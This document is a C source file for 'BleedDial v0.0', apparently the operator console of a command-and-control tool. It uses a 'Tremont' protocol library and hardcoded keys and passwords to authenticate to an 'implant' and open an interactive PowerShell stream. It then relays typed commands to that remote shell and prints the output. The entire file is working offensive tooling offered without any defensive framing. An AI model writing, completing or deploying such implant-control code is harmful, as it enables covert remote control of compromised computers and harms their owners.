#include<stdio.h>
#include<conio.h>

#include<WS2tcpip.h>
#include<winsock2.h>

#include "tremont.h"

#pragma comment(lib, "Ws2_32.lib")

void init_winsock() {
	printf("Initiallizing Winsock...\n");
	WSADATA wsa_data;
	int startup_result = WSAStartup(MAKEWORD(2, 2), &wsa_data);

	if (startup_result != 0) {
		perror("Unable to initialize Winsock!\n");
		exit(-1);
	}
}

void setup_socket(SOCKET* sock) {
	struct addrinfo* res = NULL;
	struct addrinfo hints;

	ZeroMemory(&hints, sizeof(hints));

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_protocol = IPPROTO_UDP;
    int addr_info_res = getaddrinfo("127.0.0.1", "9999", &hints, &res);
    if (addr_info_res != 0) {
        perror("Invaid address!\n");
        exit(-1);
    }

    *sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (*sock == INVALID_SOCKET) {
        perror("Invalid socket!");
        exit(-1);
    }

    int bind_result = bind(*sock, res->ai_addr, (int)res->ai_addrlen);
	if (bind_result == SOCKET_ERROR) {
		perror("Unable to bind socket!");
		exit(-1);
	}

    freeaddrinfo(res);
}

void setup_tremont(SOCKET* sock, Tremont_Nexus** nexus) {
    int res = 0;

    res = tremont_init_nexus(nexus);
    if (res != 0) {
        perror("Unable to initialize Tremont nexus!");
        exit(-1);
    }

    char key[] = "lets learn about IELR(1) parser generators";
    res = tremont_key_nexus(key, sizeof(key), *nexus);
    if (res != 0) {
        perror("Unable to key Tremont nexus!");
        exit(-1);
    }

    res = tremont_bind_nexus(*sock, *nexus);
    if (res != 0) {
        perror("Unable to bind Tremont nexus!");
        exit(-1);
    }
}

void tone_powershell(Tremont_Nexus* nexus) {
    int res = -1;
    struct sockaddr implant_addr;
    
    res = tremont_getaddr_stream(9999, &implant_addr, nexus);
    if(res != 0) {
        perror("Unable to get addr of control stream!\n");
        exit(-1);
    }

    char key[] = "cardstock's mom";
    tremont_auth_stream(7777, key, sizeof(key), nexus);

    res = tremont_req_stream(7777, &implant_addr, 5, nexus);
    if (res != 0) {
        perror("Unable to request stream!\n");
        exit(-1);
    }

    tremont_opts_stream(7777, OPT_NONBLOCK, 1, nexus);

    char temp_input[255];
    char temp_recv[255];
    int cur_char = 0;
    int input_len = 0;

    while (1) {
        memset(temp_recv, 0, sizeof(temp_recv));
        if (tremont_poll_stream(7777, nexus) == -1) break;
        tremont_recv(7777, temp_recv, sizeof(temp_recv), nexus);
        printf("%s", temp_recv);

        if (_kbhit()) {
            cur_char = getchar();
            
            if (cur_char == 3 || cur_char == EOF) 
                break;

            if (cur_char == '\r') {
                temp_input[0] = '\n';
                tremont_send(7777, temp_input, 1, nexus);
                continue;
            }
            
            temp_input[0] = (char)cur_char;
            fgets(temp_input + 1, sizeof(temp_input), stdin);
            strcat_s(temp_input, sizeof(temp_input), "\r\n");
            
            input_len = (int)strlen(temp_input);
            tremont_send(7777, temp_input, input_len, nexus);
            
            memset(temp_input, 0, input_len);
        }
    }

    tremont_end_stream(7777, nexus);
}

int main() {
	printf("BleedDial v0.0\n");
	
	init_winsock();

	SOCKET sock;
	setup_socket(&sock);

	Tremont_Nexus* nexus;
	setup_tremont(&sock, &nexus);

    tremont_set_size(300, nexus);

    char password[] = "badapple1998";
    tremont_auth_stream(9999, password, sizeof(password), nexus);

    tremont_accept_stream(9999, 0, nexus);

    tone_powershell(nexus);

    getchar();
    return 0;
}